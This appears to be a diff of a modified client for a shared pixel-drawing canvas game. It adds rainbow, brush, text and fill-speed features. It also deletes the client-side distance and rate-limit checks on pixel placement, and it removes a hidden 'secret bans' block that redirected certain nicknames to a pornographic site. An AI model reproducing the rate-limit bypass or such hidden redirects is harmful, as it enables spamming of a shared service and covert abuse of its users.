-				fillChunk(Math.floor(mouse.tileX / _conf.protocol.chunkSize), Math.floor(mouse.tileY / _conf.protocol.chunkSize), [255, 255, 255]);
-				return 1;
-			}
-		});
-	}));
-
 	// Zoom tool
 	addTool(new Tool('Zoom', _tool_renderer.cursors.zoom, _Fx.PLAYERFX.NONE, _conf.RANK.NONE, function (tool) {
 		function zoom(mouse, type) {
@@ -3678,7 +3591,7 @@ addTool(new Tool('Area Erase', _tool_renderer.cursors.areaerase, _Fx.PLAYERFX.RE
 	}));
 
 	// Area to PNG tool
-	addTool(new Tool('Export', _tool_renderer.cursors.cut, _Fx.PLAYERFX.NONE, _conf.RANK.NONE, function (tool) {
+	addTool(new Tool('Export', _tool_renderer.cursors.select, _Fx.PLAYERFX.NONE, _conf.RANK.NONE, function (tool) {
 		tool.setFxRenderer(function (fx, ctx, time) {
 			if (!fx.extra.isLocalPlayer) return 1;
 			var x = fx.extra.player.x;
@@ -3870,21 +3783,31 @@ addTool(new Tool('Area Erase', _tool_renderer.cursors.areaerase, _Fx.PLAYERFX.RE
 	}));
 
 	// Fill tool
+	document.addEventListener("keydown", rainbowToggle, false);
+
+  var rainbowPressed = null;
+  function rainbowToggle(e) {
+    /* tab key pressed to toggle rainbow mode */
+    if (e.keyCode == 9) {
+      rainbowPressed = !rainbowPressed;
+    }
+  }
+	// Fill tool
 	addTool(new Tool('Fill', _tool_renderer.cursors.fill, _Fx.PLAYERFX.NONE, _conf.RANK.USER, function (tool) {
 		tool.extra.tickAmount = 6;
 		var queue = [];
 		var fillingColor = null;
-		var defaultFx = _Fx.PLAYERFX.RECT_SELECT_ALIGNED(1);
+		var defaultFx = OWOP.fx.player.RECT_SELECT_ALIGNED(1);
 		tool.setFxRenderer(function (fx, ctx, time) {
 			ctx.globalAlpha = 0.8;
 			ctx.strokeStyle = fx.extra.player.htmlRgb;
-			var z = _canvas_renderer.camera.zoom;
+			var z = OWOP.camera.zoom;
 			if (!fillingColor || !fx.extra.isLocalPlayer) {
 				defaultFx(fx, ctx, time);
 			} else {
 				ctx.beginPath();
 				for (var i = 0; i < queue.length; i++) {
-					ctx.rect((queue[i][0] - _canvas_renderer.camera.x) * z, (queue[i][1] - _canvas_renderer.camera.y) * z, z, z);
+					ctx.rect((queue[i][0] - OWOP.camera.x) * z, (queue[i][1] - OWOP.camera.y) * z, z, z);
 				}
 				ctx.stroke();
 			}
@@ -3894,7 +3817,7 @@ addTool(new Tool('Area Erase', _tool_renderer.cursors.areaerase, _Fx.PLAYERFX.RE
 				return a && b && a[0] === b[0] && a[1] === b[1] && a[2] === b[2];
 			};
 			var check = function check(x, y) {
-				if (eq(_main.misc.world.getPixel(x, y), fillingColor)) {
+				if (eq(OWOP.world.getPixel(x, y), fillingColor)) {
 					queue.unshift([x, y]);
 					return true;
 				}
@@ -3904,32 +3827,35 @@ addTool(new Tool('Area Erase', _tool_renderer.cursors.areaerase, _Fx.PLAYERFX.RE
 			if (!queue.length || !fillingColor) {
 				return;
 			}
-
-			var selClr = _local_player.player.selectedColor;
+			if (!rainbowPressed) {
+			var selClr = OWOP.player.selectedColor;
+			} else {
+			var selClr = [(Math.random()*255)|0, (Math.random()*255)|0, (Math.random()*255)|0]
+			}
 			var painted = 0;
 			var tickAmount = tool.extra.tickAmount;
 			for (var painted = 0; painted < tickAmount && queue.length; painted++) {
 				var current = queue.pop();
 				var x = current[0];
 				var y = current[1];
-				var thisClr = _main.misc.world.getPixel(x, y);
+				var thisClr = OWOP.world.getPixel(x, y);
 				if (eq(thisClr, fillingColor) && !eq(thisClr, selClr)) {
-					if (!_main.misc.world.setPixel(x, y, selClr)) {
+					if (!OWOP.world.setPixel(x, y, selClr)) {
 						queue.push(current);
 						break;
 					}
 
 					// diamond check first
-					var top = check(x, y - 1);
+					var oof = check(x, y - 1);
 					var bottom = check(x, y + 1);
 					var left = check(x - 1, y);
 					var right = check(x + 1, y);
 
 					// if corners are not closed by parts of the diamond, then they can be accessed
-					if (top && left) {
+					if (oof && left) {
 						check(x - 1, y - 1);
 					}
-					if (top && right) {
+					if (oof && right) {
 						check(x + 1, y - 1);
 					}
 					if (bottom && left) {
@@ -3949,7 +3875,7 @@ addTool(new Tool('Area Erase', _tool_renderer.cursors.areaerase, _Fx.PLAYERFX.RE
 		}
 		tool.setEvent('mousedown', function (mouse) {
 			if (!(mouse.buttons & 4)) {
-				fillingColor = _main.misc.world.getPixel(mouse.tileX, mouse.tileY);
+				fillingColor = OWOP.world.getPixel(mouse.tileX, mouse.tileY);
 				if (fillingColor) {
 					queue.push([mouse.tileX, mouse.tileY]);
 					tool.setEvent('tick', tick);
@@ -3963,9 +3889,30 @@ addTool(new Tool('Area Erase', _tool_renderer.cursors.areaerase, _Fx.PLAYERFX.RE
 				tool.setEvent('tick', null);
 			}
 		});
+		
 	}));
+var tonq = OWOP.windowSys.addWindow(new OWOP.windowSys.class.window('Fill Speed', {}, function(win) {
+        win.container.title = 'Sets Fill Speed';
+        win.container.style.height = '16px';
+        win.container.style.overflow = 'hidden';
 
-	//Line Tool
+        var h = OWOP.util.mkHTML('span', { innerHTML: OWOP.tool.allTools.fill.extra.tickAmount });
+        win.addObj(h);
+        var asd = OWOP.util.mkHTML('input', {
+            type: 'range', style: '-moz-appearance:none;-webkit-appearance:none;appearance:none;height:6px;outline:none;float:right;',
+            min: 5, max: 250,
+            value: OWOP.tool.allTools.fill.extra.tickAmount,
+            oninput: function() {
+                OWOP.tool.allTools.fill.extra.tickAmount = this.value;
+                h.innerHTML = this.value;
+            }, ondblclick:function() {
+                this.value = 3; 
+                this.onchange();
+            }
+        });
+        win.addObj(asd);
+    }).move(800, 102));
+	
 	addTool(new Tool('Line', _tool_renderer.cursors.wand, _Fx.PLAYERFX.NONE, _conf.RANK.USER, function (tool) {
 		var start = null;
 		var end = null;
@@ -4005,6 +3952,17 @@ addTool(new Tool('Area Erase', _tool_renderer.cursors.areaerase, _Fx.PLAYERFX.RE
 				ctx.stroke();
 			}
 		});
+
+    document.addEventListener("keydown", rainbowToggle, false);
+
+    var rainbowPressed = null;
+    function rainbowToggle(e) {
+      /* tab key pressed to toggle rainbow mode */
+      if (e.keyCode == 9) {
+        rainbowPressed = !rainbowPressed;
+      }
+    }
+
 		function tick() {
 			for (var painted = 0; painted < 3 && queue.length; painted++) {
 				var current = queue.pop();
@@ -4013,7 +3971,7 @@ addTool(new Tool('Area Erase', _tool_renderer.cursors.areaerase, _Fx.PLAYERFX.RE
 				if ((c[0] != pc[0] || c[1] != pc[1] || c[2] != pc[2]) && !_main.misc.world.setPixel(current[0], current[1], _local_player.player.selectedColor)) {
 					queue.push(current);
 					break;
-				}
+        }
 			}
 			if (!queue.length) {
 				start = null;
@@ -4042,9 +4000,15 @@ addTool(new Tool('Area Erase', _tool_renderer.cursors.areaerase, _Fx.PLAYERFX.RE
 					end = null;
 					return;
 				}
-				if (_local_player.player.rank == _conf.RANK.ADMIN) {
+				if (rainbowPressed == false) {
 					line(start[0], start[1], end[0], end[1], function (x, y) {
 						_main.misc.world.setPixel(x, y, _local_player.player.selectedColor);
+					});
+					start = null;
+					end = null;
+        } else if (rainbowPressed == true) {
+					line(start[0], start[1], end[0], end[1], function (x, y) {
+						_main.misc.world.setPixel(x, y, [(Math.random()*255)|0, (Math.random()*255)|0, (Math.random()*255)|0]);
 					});
 					start = null;
 					end = null;
@@ -4063,9 +4027,91 @@ addTool(new Tool('Area Erase', _tool_renderer.cursors.areaerase, _Fx.PLAYERFX.RE
 			tool.setEvent('tick', null);
 		});
 	}));
+addTool(new Tool('Brush', _tool_renderer.cursors.brush, _Fx.PLAYERFX.NONE, _conf.RANK.USER, function (tool) {
+    tool.brDiameter = 5; //Declaring variable for brush diameter.
+    var rainbowPressed = null;    
+    var lastX, lastY;
 
-	//Area Protect
-	addTool(new Tool('Area Protect', _tool_renderer.cursors.areaprotect, _Fx.PLAYERFX.NONE, _conf.RANK.MODERATOR, function (tool) {
+    tool.setEvent('mousedown mousemove', function (mouse, event) {
+    var usedButtons = 3; /* Left and right mouse buttons are always used... */
+    var color = mouse.buttons === 2 ? [255, 255, 255] : OWOP.player.selectedColor; /* White color if right clicking */
+    switch (OWOP.mouse.buttons) {
+        case 1:
+        case 2:
+            if (!lastX || !lastY) {
+                lastX = OWOP.mouse.tileX;
+                lastY = OWOP.mouse.tileY;
+            }
+            (0, OWOP.util.line)(lastX, lastY, OWOP.mouse.tileX, OWOP.mouse.tileY, 1, function (x, y) {
+                var pixel = OWOP.world.getPixel(x, y);
+                var R = Math.floor(tool.brDiameter / 2);
+                if (pixel !== null) {
+                    if (!rainbowPressed && mouse.buttons == 1) {
+                    for(var ix = 0; ix < tool.brDiameter;  ix++) {
+                      for(var iy = 0; iy < tool.brDiameter; iy++) {
+                        OWOP.world.setPixel(x + ix - R, y + iy - R, color);
+                      }
+                    }
+                    } else if (rainbowPressed && mouse.buttons == 1) {
+                      for(var ix = 0; ix < tool.brDiameter;  ix++) {
+                        for(var iy = 0; iy < tool.brDiameter; iy++) {
+                          OWOP.world.setPixel(x + ix - R, y + iy - R, [(Math.random()*255)|0, (Math.random()*255)|0, (Math.random()*255)|0]);
+                        }
+                      }
+                    } else if (mouse.buttons == 2) {
+                      for(var ix = 0; ix < tool.brDiameter;  ix++) {
+                        for(var iy = 0; iy < tool.brDiameter; iy++) {
+                          OWOP.world.setPixel(x + ix - R, y + iy - R, [255,255,255]);
+                        }
+                      }
+                    }
+            }});
+            lastX = OWOP.mouse.tileX;
+            lastY = OWOP.mouse.tileY;
+            break;
+        case 4:
+            if (event.ctrlKey) {
+                usedButtons |= 4;
+                var color = _OWOP.world.getPixel(mouse.tileX, mouse.tileY);
+                if (color) {
+                    OWOP.player.selectedColor = color;
+                }
+            }
+            break;
+            }
+            return usedButtons;
+        });
+    tool.setEvent('mouseup', function (mouse) {
+    lastX = null;
+    lastY = null;
+    });
+		
+         
+	
+}));
+var brDiamWin = OWOP.windowSys.addWindow(new OWOP.windowSys.class.window('Brush diameter', {}, function(win) {
+      win.container.title = 'Double-click a seekbar to reset it to 3.';
+      win.container.style.height = '16px';
+      win.container.style.overflow = 'hidden';
+
+      var brDiamElm = OWOP.util.mkHTML('span', { innerHTML: OWOP.tool.allTools.brush.brDiameter });
+      win.addObj(brDiamElm);
+      var Rbar = OWOP.util.mkHTML('input', {
+          type: 'range', style: '-moz-appearance:none;-webkit-appearance:none;appearance:none;height:6px;outline:none;float:right;',
+          min: 2, max: 16,
+          value: OWOP.tool.allTools.brush.brDiameter,
+          oninput: function() {
+              OWOP.tool.allTools.brush.brDiameter = this.value;
+              brDiamElm.innerHTML = this.value;
+          }, ondblclick:function() {
+              this.value = 3;
+              this.onchange();
+          }
+      });
+      win.addObj(Rbar);
+    }).move(800, 32));
+    
+addTool(new Tool('Selectprotect', _tool_renderer.cursors.selectprotect, _Fx.PLAYERFX.NONE, _conf.RANK.MODERATOR, function (tool) {
 		tool.setFxRenderer(function (fx, ctx, time) {
 			if (!fx.extra.isLocalPlayer) return 1;
 			var x = fx.extra.player.x;
@@ -4261,45 +4307,42 @@ addTool(new Tool('Area Erase', _tool_renderer.cursors.areaerase, _Fx.PLAYERFX.RE
 		});
 	}));
 
-//Protect Tool
-addTool(new Tool('Protect', _tool_renderer.cursors.shield, _Fx.PLAYERFX.RECT_SELECT_ALIGNED(16, "#000000"), _conf.RANK.MODERATOR, function (tool) {
-	tool.setFxRenderer(function (fx, ctx, time) {
-		var x = fx.extra.player.x;
-		var y = fx.extra.player.y;
-		var fxx = (Math.floor(x / 256) * 16 - _canvas_renderer.camera.x) * _canvas_renderer.camera.zoom;
-		var fxy = (Math.floor(y / 256) * 16 - _canvas_renderer.camera.y) * _canvas_renderer.camera.zoom;
-		ctx.globalAlpha = 0.5;
-		var chunkX = Math.floor(fx.extra.player.tileX / _conf.protocol.chunkSize);
-		var chunkY = Math.floor(fx.extra.player.tileY / _conf.protocol.chunkSize);
-		var chunk = _main.misc.world.getChunkAt(chunkX, chunkY);
-		if (chunk) {
-			ctx.fillStyle = chunk.locked ? "#00FF00" : "#FF0000";
-			ctx.fillRect(fxx, fxy, _canvas_renderer.camera.zoom * 16, _canvas_renderer.camera.zoom * 16);
-		}
-		return 1; /* Rendering finished (won't change on next frame) */
-	});
-	tool.setEvent('mousedown mousemove', function (mouse) {
-		var chunkX = Math.floor(mouse.tileX / _conf.protocol.chunkSize);
-		var chunkY = Math.floor(mouse.tileY / _conf.protocol.chunkSize);
-		var chunk = _main.misc.world.getChunkAt(chunkX, chunkY);
-		switch (mouse.buttons) {
-			case 1:
-				if (!chunk.locked) {
-					_networking.net.protocol.protectChunk(chunkX, chunkY, 1);
-				}
-				break;
+	addTool(new Tool('Protect', _tool_renderer.cursors.shield, _Fx.PLAYERFX.RECT_SELECT_ALIGNED(16, "#000000"), _conf.RANK.MODERATOR, function (tool) {
+		tool.setFxRenderer(function (fx, ctx, time) {
+			var x = fx.extra.player.x;
+			var y = fx.extra.player.y;
+			var fxx = (Math.floor(x / 256) * 16 - _canvas_renderer.camera.x) * _canvas_renderer.camera.zoom;
+			var fxy = (Math.floor(y / 256) * 16 - _canvas_renderer.camera.y) * _canvas_renderer.camera.zoom;
+			ctx.globalAlpha = 0.5;
+			var chunkX = Math.floor(fx.extra.player.tileX / _conf.protocol.chunkSize);
+			var chunkY = Math.floor(fx.extra.player.tileY / _conf.protocol.chunkSize);
+			var chunk = _main.misc.world.getChunkAt(chunkX, chunkY);
+			if (chunk) {
+				ctx.fillStyle = chunk.locked ? "#00FF00" : "#FF0000";
+				ctx.fillRect(fxx, fxy, _canvas_renderer.camera.zoom * 16, _canvas_renderer.camera.zoom * 16);
+			}
+			return 1; /* Rendering finished (won't change on next frame) */
+		});
+		tool.setEvent('mousedown mousemove', function (mouse) {
+			var chunkX = Math.floor(mouse.tileX / _conf.protocol.chunkSize);
+			var chunkY = Math.floor(mouse.tileY / _conf.protocol.chunkSize);
+			var chunk = _main.misc.world.getChunkAt(chunkX, chunkY);
+			switch (mouse.buttons) {
+				case 1:
+					if (!chunk.locked) {
+						_networking.net.protocol.protectChunk(chunkX, chunkY, 1);
+					}
+					break;
 
-			case 2:
-				if (chunk.locked) {
-					_networking.net.protocol.protectChunk(chunkX, chunkY, 0);
-				}
-				break;
-		}
-	});
-}));
-
-//Copy tool
-OWOP.tool.addToolObject(new OWOP.tool.class("Copy", OWOP.cursors.copy, OWOP.fx.player.NONE, OWOP.RANK.ADMIN, function (tool) {
+				case 2:
+					if (chunk.locked) {
+						_networking.net.protocol.protectChunk(chunkX, chunkY, 0);
+					}
+					break;
+			}
+		});
+	}));
+addTool(new Tool('Clone', _tool_renderer.cursors.copy, _Fx.PLAYERFX.RECT_SELECT_ALIGNED(16), _conf.RANK.ADMIN, function (tool) {
     function drawText(ctx, str, x, y, centered) {
         ctx.strokeStyle = "#000000", ctx.fillStyle = "#FFFFFF", ctx.lineWidth = 2.5, ctx.globalAlpha = 0.5;
         if (centered) {
@@ -4464,19 +4507,141 @@ OWOP.tool.addToolObject(new OWOP.tool.class("Copy", OWOP.cursors.copy, OWOP.fx.p
                 }
             }
             ctx.putImageData(d, 0, 0);
-			var paste = OWOP.tool.allTools.paste;
+			var paste = OWOP.tool.allTools.stamp;
             paste.extra.canvas = c;
 			var oldSelect = paste.events.select;
 			paste.events.select = function() {
 				paste.events.select = oldSelect;
 			};
-			OWOP.player.tool = "paste";
+			OWOP.player.tool = "stamp";
         }
     });
-}));
+	}));
+addTool(new Tool('Text', _tool_renderer.cursors.write, _Fx.PLAYERFX.NONE, _conf.RANK.USER, function (tool) {
+    document.addEventListener("keydown", rainbowToggle, false);
 
-//Paste tool 
-	addTool(new Tool('Paste', _tool_renderer.cursors.paste, _Fx.PLAYERFX.NONE, _conf.RANK.ADMIN, function (tool) {
+    var rainbowPressed = null;
+    function rainbowToggle(e) {
+      /* tab key pressed to toggle rainbow mode */
+      if (e.keyCode == 9) {
+        rainbowPressed = !rainbowPressed;
+      }
+    }
+
+    var color = null;
+    function rainbowHandler(e) {
+      if (rainbowPressed == true) {
+        color = [(Math.random()*255)|0, (Math.random()*255)|0, (Math.random()*255)|0];
+      } else if (rainbowPressed == false) {
+        color = OWOP.player.selectedColor;
+      } else if (rainbowPressed == null) {
+        color = OWOP.player.selectedColor;
+      }
+    }
+    setInterval(rainbowHandler,0);
+
+		var xPos = null;
+    var yPos = null;
+    var fonts = {};
+    var font = null;
+    
+    var fontInput = new OWOP.windowSys.class.input("Choose Font", "913,1245,955,1192,831", "number", function(value) {
+      var id = parseInt(value);
+      if (id in fonts) {
+        font = id;
+        return;
+      }
+      
+      var xhttp = new XMLHttpRequest();
+          xhttp.addEventListener("load", function() {
+              var source = xhttp.responseXML.body.children[2].innerHTML;
+        var data = JSON.parse(source.match(/loadData\('(.+)'\)/)[1]);
+        var meta = source.match(/drawSample\('',([0-9]+),(-?[0-9]+)\)/);
+        data.letterspace = parseInt(meta[1]);
+        data.monospacewidth = parseInt(meta[2]);
+        
+              fonts[id] = data;
+        font = id;
+          });
+          xhttp.open("GET", "https://cors-anywhere.herokuapp.com/http://www.pentacom.jp/pentacom/bitfontmaker2/gallery/?id=" + id);
+          xhttp.responseType = "document";
+          xhttp.send();
+    });
+    
+    var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";
+      chars += "Â¡Â¢Â£â‚¬Â¤Â¥Â¦Â§Â¨Â©ÂªÂ«Â¬Â®Â¯Â°Â±Â²Â³Â´ÂµÂ¶Â·Â¸Â¹ÂºÂ»Â¼Â½Â¾Â¿Ã€ÃÃ‚ÃƒÃ„Ã…Ã†Ã‡ÃˆÃ‰ÃŠÃ‹ÃŒÃÃŽÃÃÃ‘Ã’Ã“Ã”Ã•Ã–Ã—Ã˜Ã™ÃšÃ›ÃœÃÃžÃŸÃ Ã¡Ã¢Ã£Ã¤Ã¥Ã¦Ã§Ã¨Ã©ÃªÃ«Ã¬Ã­Ã®Ã¯Ã°Ã±Ã²Ã³Ã´ÃµÃ¶Ã·Ã¸Ã¹ÃºÃ»Ã¼Ã½Ã¾Ã¿";
+      chars += "Ä€ÄÄ‚ÄƒÄ„Ä…Ä†Ä‡ÄˆÄ‰ÄŠÄ‹ÄŒÄÄŽÄÄÄ‘Ä’Ä“Ä”Ä•Ä–Ä—Ä˜Ä™ÄšÄ›ÄœÄÄžÄŸÄ Ä¡Ä¢Ä£Ä¤Ä¥Ä¦Ä§Ä¨Ä©ÄªÄ«Ä¬Ä­Ä®Ä¯Ä°Ä±Ä²Ä³Ä´ÄµÄ¶Ä·Ä¸Ä¹ÄºÄ»Ä¼Ä½Ä¾Ä¿Å€ÅÅ‚ÅƒÅ„Å…Å†Å‡ÅˆÅ‰ÅŠÅ‹ÅŒÅÅŽÅÅÅ‘Å’Å“Å”Å•Å–Å—Å˜Å™ÅšÅ›ÅœÅÅžÅŸÅ Å¡Å¢Å£Å¤Å¥Å¦Å§Å¨Å©ÅªÅ«Å¬Å­Å®Å¯Å°Å±Å²Å³Å´ÅµÅ¶Å·Å¸Å¹ÅºÅ»Å¼Å½Å¾";
+    
+    tool.setFxRenderer(function (fx, ctx, time) {
+          var x = fx.extra.player.x;
+          var y = fx.extra.player.y;
+      if (xPos !== null && yPos !== null) {
+        x = xPos * 16;
+        y = yPos * 16;
+      }
+          var fxx = (Math.floor(x / 16) - OWOP.camera.x) * OWOP.camera.zoom;
+          var fxy = (Math.floor(y / 16) - OWOP.camera.y) * OWOP.camera.zoom;
+          ctx.globalAlpha = 0.8;
+          ctx.strokeStyle = fx.extra.player.htmlRgb;
+          ctx.strokeRect(fxx, fxy, OWOP.camera.zoom, OWOP.camera.zoom * 12);
+          return 0;
+      });
+    
+    tool.setEvent("select", function() {
+      OWOP.windowSys.addWindow(fontInput);
+    });
+    tool.setEvent("deselect", function() {
+      font = null;
+    });
+    
+    tool.setEvent("mousedown mousemove", function (mouse, event) {
+      if (mouse.buttons === 1) {
+        xPos = mouse.tileX;
+        yPos = mouse.tileY;
+      }
+    });
+    tool.setEvent("keydown", function() {return true;});
+    tool.setEvent("keyup", function() {return true;});
+    
+    window.addEventListener("keypress", function(event) {
+      if (font === null || xPos === null || yPos === null || ["INPUT", "TEXTAREA"].includes(document.activeElement.tagName)) {
+        return;
+      }
+      
+      var f = fonts[font];
+      var letterSpacing = (f.letterspace / 64 | 0) - 1;
+      var isMono = f.monospacewidth !== -1;
+      
+      if (event.which == 32) {
+        xPos += isMono ? f.monospacewidth : 4 + letterSpacing;
+        return;
+      }
+      
+      var char = f[event.which];
+      if (!char) {
+        return;
+      }
+      
+      var width = 0;
+          for (var y=0; y<16; y++) {
+              for (var x=0; x<16; x++) { 
+                  if (char[y] & (1 << x) && x > width) width = x;
+              }
+          }
+          for (var y=0; y<16; y++) {
+              for (var x=0; x<16; x++) {
+                  if (!(char[y] & (1 << x))) {
+            continue;
+          }
+            OWOP.world.setPixel(xPos + x - 2, yPos + y, color);
+          }
+        }
+        /* [(Math.random()*255)|0, (Math.random()*255)|0, (Math.random()*255)|0] */
+      
+      xPos += isMono ? f.monospacewidth : width + letterSpacing;
+    });
+	}));
+	addTool(new Tool('Stamp', _tool_renderer.cursors.stamp, _Fx.PLAYERFX.NONE, _conf.RANK.ADMIN, function (tool) {
 		tool.setFxRenderer(function (fx, ctx, time) {
 			var z = _canvas_renderer.camera.zoom;
 			var x = fx.extra.player.x;
@@ -4527,6 +4692,7 @@ OWOP.tool.addToolObject(new OWOP.tool.class("Copy", OWOP.cursors.copy, OWOP.fx.p
 				for (var y = 0; y < _conf.protocol.chunkSize; y++) {
 					for (var x = 0; x < _conf.protocol.chunkSize; x++) {
 						var color = getModifiedPixel(x + offX, y + offY);
+						_networking.net.protocol.requestChunk(offX, offY);
 						if (color !== null) {
 							if (color & 0xFF000000) {
 								++modified;
@@ -4540,6 +4706,7 @@ OWOP.tool.addToolObject(new OWOP.tool.class("Copy", OWOP.cursors.copy, OWOP.fx.p
 				}
 				return modified ? tmpBuffer : null;
 			};
+			
 			if (!_networking.net.protocol.setChunk) {
 				throw new Error("Protocol doesn't support pasting");
 			}
@@ -4589,7 +4756,7 @@ OWOP.tool.addToolObject(new OWOP.tool.class("Copy", OWOP.cursors.copy, OWOP.fx.p
 
 	_global.eventSys.emit(_conf.EVENTS.misc.toolsInitialized);
 });
-//tools tolbar
+
 _global.eventSys.once(_conf.EVENTS.init, function () {
 	exports.toolsWindow = toolsWindow = new _windowsys.GUIWindow('Tools', {}, function (wdow) {
 		wdow.container.id = "toole-container";
@@ -5434,8 +5601,6 @@ var _conf = __webpack_require__(1);
 
 var _global = __webpack_require__(0);
 
-//tools position
-
 var cursors = exports.cursors = {
 	set: new Image(),
 	cursor: { imgpos: [0, 0], hotspot: [0, 0] },
@@ -5444,17 +5609,16 @@ var cursors = exports.cursors = {
 	erase: { imgpos: [0, 2], hotspot: [4, 26] },
 	zoom: { imgpos: [1, 2], hotspot: [19, 10] },
 	fill: { imgpos: [1, 1], hotspot: [3, 29] },
+	areaerase: { imgpos: [4,1], hotspot: [0,0] },
 	brush: { imgpos: [0, 3], hotspot: [0, 26] },
-	select: { imgpos: [2, 0], hotspot: [0, 0] }, // needs better hotspot
+	select: { imgpos: [2, 0], hotspot: [0, 0] },
+	selectprotect: { imgpos: [4, 0], hotspot: [0, 0] },	// needs better hotspot
 	copy: { imgpos: [3, 0], hotspot: [0, 0] }, // and this
-	paste: { imgpos: [3, 1], hotspot: [0, 0] }, // this too
+	stamp: { imgpos: [3, 1], hotspot: [0, 0] }, // this too
 	cut: { imgpos: [3, 2], hotspot: [11, 5] },
 	wand: { imgpos: [3, 3], hotspot: [0, 0] },
 	shield: { imgpos: [2, 3], hotspot: [18, 18] },
 	kick: { imgpos: [2, 1], hotspot: [3, 6] },
-	areaprotect: { imgpos: [4, 0], hotspot: [0, 0] },
-	selectprotect: { imgpos: [4, 0], hotspot: [0, 0] },
-	areaerase: { imgpos: [4, 1], hotspot: [0, 0] },
 	ban: { imgpos: [3, 0], hotspot: [10, 4] },
 	write: { imgpos: [1, 3], hotspot: [10, 4] // fix hotspot
 	} };
@@ -6371,22 +6535,22 @@ var OldProtocol = exports.OldProtocol = {
 	placeBucket: (_placeBucket = {}, _defineProperty(_placeBucket, _conf.RANK.NONE, [0, 1]), _defineProperty(_placeBucket, _conf.RANK.USER, [32, 4]), _defineProperty(_placeBucket, _conf.RANK.MODERATOR, [32, 2]), _defineProperty(_placeBucket, _conf.RANK.ADMIN, [32, 0]), _placeBucket),
 	maxMessageLength: (_maxMessageLength = {}, _defineProperty(_maxMessageLength, _conf.RANK.NONE, 128), _defineProperty(_maxMessageLength, _conf.RANK.USER, 128), _defineProperty(_maxMessageLength, _conf.RANK.MODERATOR, 512), _defineProperty(_maxMessageLength, _conf.RANK.ADMIN, 16384), _maxMessageLength),
 	tools: {
-		id: {}, /* Generated automatically  showed tools*/
+		id: {}, /* Generated automatically */
 		0: 'cursor',
-		1: 'move',
-		2: 'pipette',
-		3: 'eraser',
-		4: 'zoom',
-		5: 'fill',
-		6: 'paste',
-		7: 'export',
-		8: 'line',
-		9: 'protect',
-		10: 'area protect',
-		11: 'area erase',
-		12: 'text',
-		13: 'brush',
-		14: 'copy'
+        1: 'move',
+        2: 'pipette',
+        3: 'eraser',
+        4: 'zoom',
+        5: 'fill',
+        6: 'stamp',
+        7: 'export',
+        8: 'line',
+        9: 'protect',
+        10: 'areaerase',
+        11: 'brush',
+        12: 'clone',
+		13: 'selectprotect',
+		14: 'text'
 	},
 	misc: {
 		worldVerification: 1234,
@@ -6695,7 +6859,7 @@ var OldProtocolImpl = function (_Protocol) {
 			var distx = Math.trunc(x / OldProtocol.chunkSize) - Math.trunc(this.lastSentX / (OldProtocol.chunkSize * 16));distx *= distx;
 			var disty = Math.trunc(y / OldProtocol.chunkSize) - Math.trunc(this.lastSentY / (OldProtocol.chunkSize * 16));disty *= disty;
 			var dist = Math.sqrt(distx + disty);
-			if (this.isConnected() && (dist < 3 || _local_player.player.rank == _conf.RANK.ADMIN) && this.placeBucket.canSpend(1)) {
+			if (this.isConnected()) {
 				var array = new ArrayBuffer(11);
 				var dv = new DataView(array);
 				dv.setInt32(0, x, true);
@@ -6760,6 +6924,10 @@ var OldProtocolImpl = function (_Protocol) {
 	}, {
 		key: 'setChunk',
 		value: function setChunk(x, y, data) {
+			var chunkSize = _conf.protocol.chunkSize;
+            var chunk = _main.misc.world.chunks[Math.floor(x / chunkSize) + ',' + Math.floor(y / chunkSize)];
+            if (chunk && (!chunk.locked || _local_player.player.rank >= _conf.RANK.MODERATOR)) {
+
 			var buf = new Uint8Array(8 + OldProtocol.chunkSize * OldProtocol.chunkSize * 3);
 			var dv = new DataView(buf.buffer);
 			dv.setInt32(0, x, true);
@@ -6770,6 +6938,12 @@ var OldProtocolImpl = function (_Protocol) {
 				buf[b + 2] = data[i] >> 16 & 0xFF;
 			}
 			this.ws.send(buf.buffer);
+			
+			} else if (chunk && chunk.locked) {
+                //_main.misc.world.pathFx.extra.placeTime = time;
+                _canvas_renderer.renderer.render(_canvas_renderer.renderer.rendertype.FX);
+            }
+            return false;
 		}
 	}, {
 		key: 'clearChunk',
@@ -6881,7 +7055,7 @@ var _windowsys = __webpack_require__(11);
 
 var _main = __webpack_require__(3);
 
-var SITEKEY = "6LeD9nwUAAAAAFDsC_l6m_eO_oFwWcdnr_PMLJ_U";
+var SITEKEY = "6LcgvScUAAAAAARUXtwrM8MP0A0N70z4DHNJh-KI";
 
 function loadCaptcha(onload) {
 	if (!window.grecaptcha) {
@@ -6904,7 +7078,7 @@ function loadCaptcha(onload) {
 }
 
 function requestVerification() {
-	_windowsys.windowSys.addWindow(new _windowsys.GUIWindow("Verification needed u not a bot?", {
+	_windowsys.windowSys.addWindow(new _windowsys.GUIWindow("Verification needed", {
 		centered: true
 	}, function (wdow) {
 		var id = grecaptcha.render(wdow.addObj((0, _misc.mkHTML)("div", {
@@ -6963,15 +7137,3 @@ module.exports = __webpack_require__.p + "polyfill/canvas-toBlob.js";
 
 /***/ })
 /******/ ]);
-//# sourceMappingURL=app.js.map
-
-//secret bans
-
-if(localStorage.nick == "0") {
-window.location.replace("https://pornhub.com");
-}
-
-
-if(localStorage.nick == "(0000000000000)") {
-window.location.replace("https://fuckoff.com");
-}
